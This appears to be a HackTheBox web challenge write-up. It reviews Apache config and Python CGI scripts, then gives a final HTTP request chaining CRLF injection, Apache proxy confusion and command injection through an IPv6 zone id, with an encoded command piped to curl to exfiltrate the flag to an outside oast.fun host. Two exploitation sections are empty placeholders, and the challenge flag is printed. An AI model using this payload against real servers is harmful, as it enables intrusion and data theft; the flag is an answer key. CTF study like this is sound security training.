---
Category:
  - Web
Difficulty: Medium
Platform: HackTheBox
status: 3. Complete
tags:
  - Apache
  - CRLF-Injection
  - RW_inbox
---

# Information Gathering

## Source code review

*apache2.conf*
```xml
ServerName CyberAttack 

AddType application/x-httpd-php .php

<Location "/cgi-bin/attack-ip"> 
    Order deny,allow
    Deny from all
    Allow from 127.0.0.1
    Allow from ::1
</Location>
```

*attack-domain.py*
```py
#!/usr/bin/env python3

import cgi
import os
import re

def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
    
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

*attack-ip.py*
```py
#!/usr/bin/env python3

import cgi
import os
from ipaddress import ip_address

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

# Exploitation

## Apache Confusion Attacks

>[!bug] 
>The bug


## Parser Differential

>[!bug]
>The bug

## Final

```http
GET /cgi-bin/attack-domain?target=x&name=http://%0d%0aLocation:/l%0d%0aContent-Type:proxy:http://127.0.0.1/cgi-bin/attack-ip?target=fe80::a8bb:ccff:feee:ddf1%2525%253beval%2b$(printf%2b"\131\62\106\60\111\103\71\155\142\107\106\156\113\147\75\75"|base64%2b-d)|curl%2bmpgpmyotzaxhnesfjgkglqlekre9ma86c.oast.fun%2b-d%2b@-%26name=m3ssap0%3F%0d%0a%0d%0a HTTP/1.1
Host: 127.0.0.1
```


# Flag

>[!success] Flag
> `HTB{h4ndl1n6_m4l4k4r5_f0rc35}`
